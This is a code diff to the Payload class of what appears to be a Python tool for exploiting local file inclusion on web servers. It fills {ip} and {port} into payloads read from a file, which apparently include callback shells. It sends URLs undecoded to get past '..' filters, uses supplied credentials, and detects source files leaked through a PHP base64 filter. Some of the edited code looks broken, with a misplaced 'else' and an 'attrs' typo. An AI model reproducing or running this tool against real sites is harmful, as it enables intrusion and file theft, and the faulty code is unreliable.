@@ -84,6 +84,8 @@ class Payload:
 				print(colored('[-]','red') + ' No payload worked. Exiting...')
 				os._exit(0)
 
+
+
 	def GetPayloads(self, ip, port):
 		cwd = os.path.dirname(__file__)
 		with open(str(cwd) + "/misc.txt") as handle:
@@ -91,6 +93,7 @@ class Payload:
 			for i in range(len(payloads)):
 				payloads[i] = payloads[i].replace('{ip}', ip).replace('{port}', str(port))
 		return payloads
+
 
 
 	def Attack(self, attempt_shell=False, mode=0, force=False):
@@ -139,7 +142,6 @@ class Payload:
 
 
 
-
 	# It sends the url as is without decoding it first, so that it can bypass filters that look for ..
 	def hit(self, url):
 		if self.stealth:
@@ -153,7 +155,7 @@ class Payload:
 				response = self.cred(url)
 			else:
 				response = requests.get(url, verify=False)
-			response = str(response.content)
+			response = str(response.text)
 			return self.stripHtmlTags(response)
 		
 		except HTTPError as e:
@@ -162,8 +164,6 @@ class Payload:
 			print(colored('[-]', 'red', attrs=['bold']) + ' Reason: ' + str(e))
 		except http.client.RemoteDisconnected as e:
    			print(colored('[-]','red', attrs['bold']) + ' Reason: ' +  str(e) + "\nAborting endpoint...")
-
-
 
 
 
@@ -197,16 +197,13 @@ class Payload:
 
 
 
-
 	def cred(self, url):
 		list_creds = self.creds.split(':')
 		user = list_creds[0]
 		passwd = list_creds[1]
 		ret = requests.get(url, headers=fetchUA(), verify=False, auth=HTTPBasicAuth(user, passwd))
 		return(ret)
-
 			
-
 
 			
 	# Strips all HTML tags from the HTTP response	
@@ -214,7 +211,6 @@ class Payload:
 		htmlchars = re.compile('<.*?>')
 		clean = re.sub(htmlchars, '', tag)
 		return clean
-
 
 
 
@@ -233,7 +229,6 @@ class Payload:
 				else:
 					if self.verbosity > 0:
 						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-
 
 
 
@@ -267,34 +262,15 @@ class Payload:
 				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 			clean = self.hit(compUrl)
 			words = clean.split()
-			if len(words) > 0:
-				w = ["\\n", "\n", "\n\n"]
-				for word in words:
-					for c in w:
-						if word.__contains__(c):
-							wordd = word.strip("b'").replace(c, "")
-							wo = wordd.replace("\\t", "")
-							# All the above will sctrip all the new lines and extra characters
-							try:
-								base = base64.b64decode(wo).decode()
-							except Exception as e:
-								continue
-							if base.__contains__('<?php') or base.__contains__('<script'):
-								print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
-								if self.outfile is not None:
-									self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
-							else:
-								if self.verbosity > 0:
-									print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-					# This try is in case the base64 doesn't contain any new lines because otherwise it will be skipped
-					try:
-						base = base64.b64decode(word).decode()
-					except Exception as e:
-						continue
-					if base.__contains__('<?php') or base.__contains__('<script'):
-						print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
-						if self.outfile is not None:
-							self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
+			for word in words:
+				try:
+					base = base64.b64decode(word).decode()
+				except Exception as e:
+					continue
+				if base.__contains__('<?php') or base.__contains__('<script'):
+					print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
+					if self.outfile is not None:
+						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
 					else:
 						if self.verbosity > 0:
 							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
